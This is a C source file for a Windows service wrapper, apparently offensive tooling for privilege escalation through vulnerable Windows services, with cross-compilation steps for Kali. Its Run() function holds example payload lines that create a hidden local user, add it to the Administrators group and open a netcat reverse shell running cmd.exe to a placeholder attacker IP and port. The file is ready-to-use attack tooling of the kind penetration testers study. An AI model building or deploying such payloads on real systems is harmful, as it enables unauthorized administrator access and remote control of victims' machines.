/*
This is a C wrapper for executing windows commands if we need to include multiple commands in one payload thereby making MSFvenom payloads inappropriate for a situation.

The most common use case for this program is when exploiting vulnerable Windows Services to priv esc on Windows machines as vulnerable Windows Services are likely to be terminated by Windows Service Control Manager.

1. Put in any commands you want to execute within the Run class below.
2. Compile on Kali into a Windows EXE:
  - You will need the cross-compilation tools installed: apt-get install mingw-w64
  - 32-bit: i686-w64-mingw32-gcc -o test.exe test.c
  - 64-bit: x86_64-w64-mingw32-gcc -o test.exe test.c
*/

#include <windows.h>
#include <stdio.h>
#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
typedef short (CALLBACK* FuncType)(LPCTSTR);

int Run()
{
/* Code goes here e.g.
 system("net user servicetest Secret /ADD");
 system("net localgroup Administrators servicetest /ADD");
 system("C:\Users\test\Desktop\nc.exe [IP] [port] -e cmd.exe");
 return 0;
*/
} 

int main()
{
 SERVICE_TABLE_ENTRY ServiceTable[2];
 ServiceTable[0].lpServiceName = "ServiceNameGoesHere";
 ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 ServiceTable[1].lpServiceName = NULL;
 ServiceTable[1].lpServiceProc = NULL;
 StartServiceCtrlDispatcher(ServiceTable);
 return 0;
}

void ServiceMain(int argc, char** argv)
{
 ServiceStatus.dwServiceType = SERVICE_WIN32;
 ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
 ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
 ServiceStatus.dwWin32ExitCode = 0;
 ServiceStatus.dwServiceSpecificExitCode = 0;
 ServiceStatus.dwCheckPoint = 0;
 ServiceStatus.dwWaitHint = 0;
 hStatus = RegisterServiceCtrlHandler("ServiceNameGoesHere",
(LPHANDLER_FUNCTION)ControlHandler);
 Run(); 
 ServiceStatus.dwCurrentState = SERVICE_RUNNING;
 SetServiceStatus (hStatus, &ServiceStatus);
 while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
 {
  Sleep(SLEEP_TIME);
 }
 return;
}

void ControlHandler(DWORD request)
{
 switch(request)
 {
 case SERVICE_CONTROL_STOP:
ServiceStatus.dwWin32ExitCode = 0;
 ServiceStatus.dwCurrentState = SERVICE_STOPPED;
 SetServiceStatus (hStatus, &ServiceStatus);
 return;
 case SERVICE_CONTROL_SHUTDOWN:
 ServiceStatus.dwWin32ExitCode = 0;
 ServiceStatus.dwCurrentState = SERVICE_STOPPED;
 SetServiceStatus (hStatus, &ServiceStatus);
 return;
 default:
 break;
 }
 SetServiceStatus (hStatus, &ServiceStatus);
 return;
}
